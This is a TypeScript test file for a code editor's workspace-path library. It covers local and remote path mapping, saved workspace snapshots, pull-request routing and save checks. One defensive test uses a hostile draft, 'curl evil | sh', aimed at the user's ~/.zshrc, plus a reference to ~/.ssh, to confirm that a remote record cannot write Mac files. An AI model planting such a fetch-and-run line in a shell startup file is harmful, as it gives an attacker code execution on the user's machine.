import assert from 'node:assert/strict';
import test from 'node:test';
import { assertSaveAllowed, mapWorkspaceSnapshotPaths, nativeWorkspacePath, parseRemoteWorkspacePath, revealDisabledReason, qualifyWorkspaceResult, remoteWorkspacePath, remoteWorkspaceRequest, sessionCheckoutRoot, sessionWorkspaceRoot, workspaceChangePath } from '../src/lib/workspacePaths.ts';

test('a workspace keeps its machine even when another session is selected', () => {
  const first = remoteWorkspacePath('workbox', '/home/me/project/a.ts');
  const second = remoteWorkspacePath('other', '/home/me/project/a.ts');
  assert.notEqual(first, second);
  assert.deepEqual(remoteWorkspaceRequest({ path: first, content: second }), { profileId: 'workbox', args: { path: '/home/me/project/a.ts', content: second } });
  assert.deepEqual(parseRemoteWorkspacePath(first), { profileId: 'workbox', path: '/home/me/project/a.ts' });
});
test('file change paths resolve against local and remote session roots', () => {
  assert.equal(workspaceChangePath('/repo', '/repo/file.ts'), '/repo/file.ts');
  assert.equal(workspaceChangePath('/repo', 'file.ts'), '/repo/file.ts');
  assert.equal(workspaceChangePath('assembly-remote://workbox/repo', '/repo/file.ts'), 'assembly-remote://workbox/repo/file.ts');
  assert.equal(workspaceChangePath('assembly-remote://workbox/repo', 'file.ts'), 'assembly-remote://workbox/repo/file.ts');
});
test('cross-machine and mixed local/remote file operations fail before invoking', () => {
  const source = remoteWorkspacePath('workbox', '/a');
  assert.throws(() => remoteWorkspaceRequest({ source, target: remoteWorkspacePath('other', '/b') }), /cross machines/);
  assert.throws(() => remoteWorkspaceRequest({ source, target: '/b' }), /mix Mac and remote/);
  assert.equal(remoteWorkspaceRequest({ path: '/Users/me/a' }), null);
});
test('qualifies returned file and checkout paths without rewriting content', () => {
  assert.deepEqual(qualifyWorkspaceResult({ '/repo': [{ path: '/repo/a', content: '/literal', relativePath: 'a' }] }, 'box'), {
    'assembly-remote://box/repo': [{ path: 'assembly-remote://box/repo/a', content: '/literal', relativePath: 'a' }]
  });
});
test('remote sessions without a machine never fall back to local filesystem', () => {
  assert.equal(sessionWorkspaceRoot({ cwd: '/repo', projectId: null, executionEnvironment: 'remote' }, []), '');
  assert.equal(sessionWorkspaceRoot({ cwd: '/repo', projectId: null, executionEnvironment: 'remote', remoteProfileId: 'box' }, []), 'assembly-remote://box/repo');
  assert.equal(sessionWorkspaceRoot({ cwd: '/repo', projectId: null, executionEnvironment: 'local' }, []), '/repo');
});
test('a session is rooted at its project, not the folder it works in', () => {
  const projects = [
    { id: 'p1', machine: 'local', rootPath: '/code/assembly' },
    { id: 'p2', machine: 'box', rootPath: '/srv/edi' }
  ];
  assert.equal(sessionWorkspaceRoot({ cwd: '/worktrees/tsk-1', projectId: 'p1', executionEnvironment: 'local' }, projects), '/code/assembly');
  assert.equal(sessionWorkspaceRoot({ cwd: '/worktrees/tsk-1', projectId: null, executionEnvironment: 'local' }, projects), '/worktrees/tsk-1');
  assert.equal(sessionWorkspaceRoot({ cwd: '/srv/worktrees/a', projectId: 'p2', executionEnvironment: 'remote', remoteProfileId: 'box' }, projects), 'assembly-remote://box/srv/edi');
  // A project on another machine never roots the session.
  assert.equal(sessionWorkspaceRoot({ cwd: '/worktrees/tsk-1', projectId: 'p2', executionEnvironment: 'local' }, projects), '/worktrees/tsk-1');
});

test('Source Control follows the folder the session works in, even when a project roots its files', () => {
  assert.equal(sessionCheckoutRoot({ cwd: '/worktrees/repo/feature-x', projectId: 'p1', executionEnvironment: 'local' }), '/worktrees/repo/feature-x');
  assert.equal(
    sessionCheckoutRoot({ cwd: '/srv/worktrees/a', projectId: 'p2', executionEnvironment: 'remote', remoteProfileId: 'box' }),
    'assembly-remote://box/srv/worktrees/a'
  );
});

test('saved workspace paths round trip without retaining a client profile or rewriting drafts', () => {
  const stored = { openPaths: ['/home/me/a.txt'], activePath: '/home/me/a.txt', filesInspectionRoot: '/home/me', expandedPathsByRoot: { '/home/me': ['/home/me/sub'] }, fileStates: { '/home/me/a.txt': { content: '/home/me/leave-content-alone' } } };
  const projected = mapWorkspaceSnapshotPaths(stored, 'workbox');
  assert.equal((projected as typeof stored).activePath, 'assembly-remote://workbox/home/me/a.txt');
  assert.deepEqual(mapWorkspaceSnapshotPaths(projected, 'workbox', 'save'), stored);
});
test('saved top tabs follow their editor paths between machines', () => {
  const stored = { openPaths: ['/home/me/a.txt'], topTabs: { order: ['diff', 'editor:/home/me/a.txt', 'browser:tab-1'], activeKey: 'editor:/home/me/a.txt' } };
  const projected = mapWorkspaceSnapshotPaths(stored, 'workbox') as typeof stored;
  assert.deepEqual(projected.topTabs, {
    order: ['diff', 'editor:assembly-remote://workbox/home/me/a.txt', 'browser:tab-1'],
    activeKey: 'editor:assembly-remote://workbox/home/me/a.txt'
  });
  assert.deepEqual(mapWorkspaceSnapshotPaths(projected, 'workbox', 'save'), stored);
});
test('a Workbox Test tab kept after Back to session reloads on Workbox Test with its draft', () => {
  // A Mac session: no viewed project any more, but the remote tab and its draft stay open.
  const tab = 'assembly-remote://workbox-test/home/me/other/a.ts';
  const open = { openPaths: [tab, '/Users/me/session/b.ts'], activePath: tab, topTabs: { order: [`editor:${tab}`], activeKey: `editor:${tab}` }, fileStates: { [tab]: { draftContent: 'unsaved' } } };
  const stored = mapWorkspaceSnapshotPaths(open, null, 'save') as typeof open;
  assert.deepEqual(stored.openPaths, [tab, '/Users/me/session/b.ts']);
  assert.deepEqual(mapWorkspaceSnapshotPaths(stored, null), open);
});
test("the session's own files saved while viewing a remote project reload on the session's machine", () => {
  // A Mac session viewing the same folder on Workbox Test keeps its own Mac files on the Mac.
  const viewed = 'assembly-remote://workbox-test/Users/me/repo';
  const open = { viewedProjectRoot: viewed, openPaths: ['/Users/me/repo/a.ts', `${viewed}/a.ts`], expandedPathsByRoot: { [viewed]: [`${viewed}/src`] } };
  const stored = mapWorkspaceSnapshotPaths(open, null, 'save') as typeof open;
  assert.deepEqual(stored.openPaths, ['/Users/me/repo/a.ts', `${viewed}/a.ts`]);
  assert.deepEqual(mapWorkspaceSnapshotPaths(stored, null), open);

  // A Workbox session viewing a Mac project saves its own files natively and the Mac files as file:// paths.
  const fromWorkbox = { viewedProjectRoot: '/Users/me/mac-proj', openPaths: ['/Users/me/mac-proj/x.ts', 'assembly-remote://workbox/home/me/session/y.ts'] };
  const storedFromWorkbox = mapWorkspaceSnapshotPaths(fromWorkbox, 'workbox', 'save') as typeof fromWorkbox;
  assert.deepEqual(storedFromWorkbox, { viewedProjectRoot: 'file:///Users/me/mac-proj', openPaths: ['file:///Users/me/mac-proj/x.ts', '/home/me/session/y.ts'] });
});
test("a remote machine's saved workspace cannot open Mac files", () => {
  // The remote machine keeps this record, so it could name any Mac file and give it an unsaved draft
  // that Save would then write to the Mac. Every Mac path in it is dropped when it loads.
  const mac = 'file:///Users/me/.zshrc';
  const stored = {
    openPaths: [mac, '/home/me/y.ts'], activePath: mac, selectedPath: mac, viewedProjectRoot: 'file:///Users/me',
    fileStates: { [mac]: { draftContent: 'curl evil | sh' }, '/home/me/y.ts': { draftContent: 'mine' } },
    topTabs: { order: [`editor:${mac}`, 'editor:/home/me/y.ts'], activeKey: `editor:${mac}` },
    expandedPathsByRoot: { 'file:///Users/me': ['file:///Users/me/.ssh'], '/home/me': ['file:///Users/me/.ssh', '/home/me/src'] }
  };
  const own = 'assembly-remote://workbox/home/me/y.ts';
  assert.deepEqual(mapWorkspaceSnapshotPaths(stored, 'workbox'), {
    openPaths: [own], activePath: null, selectedPath: null, viewedProjectRoot: null,
    fileStates: { [own]: { draftContent: 'mine' } },
    topTabs: { order: [`editor:${own}`], activeKey: null },
    expandedPathsByRoot: { 'assembly-remote://workbox/home/me': ['assembly-remote://workbox/home/me/src'] }
  });
});
test('two machines with the same path stay separate in a saved workspace', () => {
  const own = 'assembly-remote://workbox/home/me/a.ts';
  const other = 'assembly-remote://workbox-test/home/me/a.ts';
  const open = { openPaths: [own, other], fileStates: { [own]: { draftContent: 'one' }, [other]: { draftContent: 'two' } } };
  const stored = mapWorkspaceSnapshotPaths(open, 'workbox', 'save') as typeof open;
  assert.deepEqual(stored.openPaths, ['/home/me/a.ts', other]);
  assert.deepEqual(mapWorkspaceSnapshotPaths(stored, 'workbox'), open);
});
test('hosted PR requests route their nested roots to the owning machine', () => {
  const root = remoteWorkspacePath('workbox', '/home/me/repo');
  assert.deepEqual(remoteWorkspaceRequest({ query: { roots: [root], mode: 'open', projectFilter: root } }, 'list_github_pull_requests'), {
    profileId: 'workbox', args: { query: { roots: ['/home/me/repo'], mode: 'open', projectFilter: '/home/me/repo' } }
  });
  assert.deepEqual(remoteWorkspaceRequest({ request: { root, number: 3, expectedHeadSha: 'a' } }, 'merge_github_pull_request'), {
    profileId: 'workbox', args: { request: { root: '/home/me/repo', number: 3, expectedHeadSha: 'a' } }
  });
  assert.deepEqual(remoteWorkspaceRequest({ query: { root, path: 'src/a.ts' } }, 'read_github_pull_request_file')?.args, { query: { root: '/home/me/repo', path: 'src/a.ts' } });
  assert.equal(remoteWorkspaceRequest({ request: { root } }, 'set_active_source_root'), null);
  assert.equal(remoteWorkspaceRequest({ query: { roots: ['/Users/me/repo'], mode: 'open' } }, 'list_github_pull_requests'), null);
});
test('hosted PR results keep their machine for follow-up reads and writes', () => {
  assert.deepEqual(qualifyWorkspaceResult({ items: [{ localRoot: '/home/me/repo', url: 'https://github.com/o/r/pull/1' }] }, 'workbox'), {
    items: [{ localRoot: 'assembly-remote://workbox/home/me/repo', url: 'https://github.com/o/r/pull/1' }]
  });
});
test('a save outside the session folder is refused while a running session works where the file is', () => {
  const session = (cwd: string, runtimeState: string, title = 'Fix login', remoteProfileId: string | null = null) =>
    ({ cwd, runtimeState, state: 'live', title, executionEnvironment: remoteProfileId ? 'remote' : 'local', remoteProfileId });
  const other = session('/work/other', 'working');
  assert.throws(() => assertSaveAllowed('/work/other/a.ts', '/work/mine', [other]), { message: '"Fix login" is working in this folder, so this file can\'t be saved here.' });
  // Allowed: in the session's own folder, while the other session is suspended, or for a folder nobody works in.
  assert.doesNotThrow(() => assertSaveAllowed('/work/mine/a.ts', '/work/mine', [session('/work/mine', 'working')]));
  assert.doesNotThrow(() => assertSaveAllowed('/work/other/a.ts', '/work/mine', [session('/work/other', 'suspended')]));
  assert.doesNotThrow(() => assertSaveAllowed('/work/other-2/a.ts', '/work/mine', [other]));
  // Machines count: the same folder on Workbox Test does not block the Mac's copy.
  const remote = session('/work/other', 'working', '', 'workbox-test');
  assert.doesNotThrow(() => assertSaveAllowed('/work/other/a.ts', '/work/mine', [remote]));
  assert.throws(() => assertSaveAllowed('assembly-remote://workbox-test/work/other/a.ts', '/work/mine', [remote]), /Another session is working/);
});

test('moved project changes browse root without changing cwd', () => {
  for (const executionEnvironment of ['local', 'remote']) {
    const machine = executionEnvironment === 'local' ? 'local' : 'box';
    const session = { cwd: '/original', projectId: 'a', executionEnvironment, remoteProfileId: 'box' };
    const projects = ['a', 'b'].map(id => ({ id, machine, rootPath: `/projects/${id}` }));
    const before = sessionWorkspaceRoot(session, projects);
    session.projectId = 'b';
    assert.notEqual(sessionWorkspaceRoot(session, projects), before);
    assert.equal(sessionWorkspaceRoot(session, projects), executionEnvironment === 'local' ? '/projects/b' : 'assembly-remote://box/projects/b');
    assert.equal(session.cwd, '/original');
  }
});
test('copy path gives the path on the owning machine, and reveal is off for remote files', () => {
  const remote = remoteWorkspacePath('workbox', '/home/me/project/a.ts');
  assert.equal(nativeWorkspacePath(remote), '/home/me/project/a.ts');
  assert.equal(nativeWorkspacePath('/Users/me/project/a.ts'), '/Users/me/project/a.ts');
  assert.match(revealDisabledReason(remote) ?? '', /remote machine/);
  assert.equal(revealDisabledReason('/Users/me/project/a.ts'), null);
});
